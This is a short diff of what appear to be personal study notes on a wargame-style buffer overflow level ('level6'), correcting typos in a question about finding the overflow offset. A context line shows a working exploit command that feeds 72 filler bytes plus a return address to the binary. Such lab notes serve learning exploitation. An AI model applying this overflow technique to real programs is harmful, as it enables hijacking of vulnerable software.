@@ -23,8 +23,8 @@ gdb level6
 ./level6 $(python -c 'print "b" * 72 + "\x54\x84\x04\x08"') 
 
 QA:
-- how did we know the correct offset?
-- overflow by any number -> get address adn pit it in 'find offset' (pattern and offset are related)
+- how do we know the correct offset?
+- overflow by any number -> get address and put it in 'find offset' (pattern and offset are related)
 
 Functions
 
